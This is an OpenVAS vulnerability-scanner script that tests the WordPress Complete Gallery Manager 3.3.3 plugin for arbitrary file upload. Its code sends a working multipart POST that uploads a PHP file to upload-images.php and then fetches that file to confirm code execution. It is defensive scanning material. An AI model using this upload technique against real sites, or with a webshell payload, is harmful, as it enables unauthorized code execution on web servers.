###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_complete_gallery_file_upload_09_13.nasl 6079 2017-05-08 09:03:33Z teissa $
#
# Wordpress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103790";
CPE = "cpe:/a:wordpress:wordpress";

tag_insight = "The vulnerability is located in the 
/plugins/complete-gallery-manager/frames/ path when processing to upload via the
upload-images.php file own malicious context or webshells. After the upload the 
remote attacker can access the file with one extension and exchange it with the 
other one to execute for example php codes.";

tag_impact = "An attacker can exploit this vulnerability to upload arbitrary code
and run it in the context of the webserver process. This may facilitate unauthorized
access or privilege escalation; other attacks are also possible.";

tag_affected = "Wordpress Complete Gallery Manager v3.3.3";

tag_summary = "Wordpress Complete Gallery Manager plugin is prone to a vulnerability
that lets attackers upload arbitrary files. The issue occurs because the application
fails to adequately sanitize user-supplied input.";

tag_solution = "Ask the vendor for an update";
tag_vuldetect = "Upload a file by sending a HTTP POST request.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 6079 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Wordpress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability");

 script_xref(name:"URL", value:"http://www.vulnerability-lab.com/get_content.php?id=1080");
 script_xref(name:"URL", value:"http://codecanyon.net/item/complete-gallery-manager-for-wordpress/2418606");
 
 script_tag(name:"last_modification", value:"$Date: 2017-05-08 11:03:33 +0200 (Mon, 08 May 2017) $");
 script_tag(name:"creation_date", value:"2013-09-19 11:10:11 +0200 (Thu, 19 Sep 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_mandatory_keys("wordpress/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

file = 'openvas_' + rand() +'.php';
str  = 'ovas_' + rand();

ex = '------------------------------69c0e1752093\r\n' + 
     'Content-Disposition: form-data; name="qqfile"; filename="' + file + '"\r\n' +
     'Content-Type: application/octet-stream\r\n' + 
     '\r\n' + 
     '<?php echo "' + str + '"; ?>\r\n' + 
     '\r\n' + 
     '------------------------------69c0e1752093--';

len = strlen(ex);     

host = get_host_name();

req = 'POST ' + dir + '/wp-content/plugins/complete-gallery-manager/frames/upload-images.php HTTP/1.1\r\n' + 
      'Host: ' + host + '\r\n' + 
      'Content-Length: ' + len + '\r\n' + 
      'Accept: */*\r\n' + 
      'Expect: 100-continue\r\n' +                   
      'Content-Type: multipart/form-data; boundary=----------------------------69c0e1752093\r\n\r\n';

soc = open_sock_tcp(port, transport:get_port_transport(port));
if(!soc)exit(0);

send(socket:soc, data:req);

while(x = recv(socket:soc, length:1024)) {
   buf += x;
}

if(buf !~ "HTTP/1.1 100 Continue") {
  close(soc);
  exit(99);
}

send(socket:soc, data:ex + '\r\n');

while(y = recv(socket:soc, length:1024)) {
   buf1 += y;
}

close(soc);

if('"success":true' >!< buf1)exit(99);

url = eregmatch(pattern:'"url":"([^"]+)"', string:buf1);
if(isnull(url[1]))exit(0);

path = url[1];
path = str_replace(string:path,find:"\", replace:"");

l_path = eregmatch(pattern:"(/wp-content/.*)", string:path);
if(isnull(l_path[1]))exit(99);

url = dir + l_path[1];
req1 = http_get(item:url, port:port);
buf2 = http_send_recv(port:port, data:req1, bodyonly:FALSE);

if(str >< buf2) {
  msg = 'The scanner was able to upload a file to ' + l_path[1] + '. Please remove this file.';
  security_message(port:port, data:msg);
  exit(0);
}

exit(99);
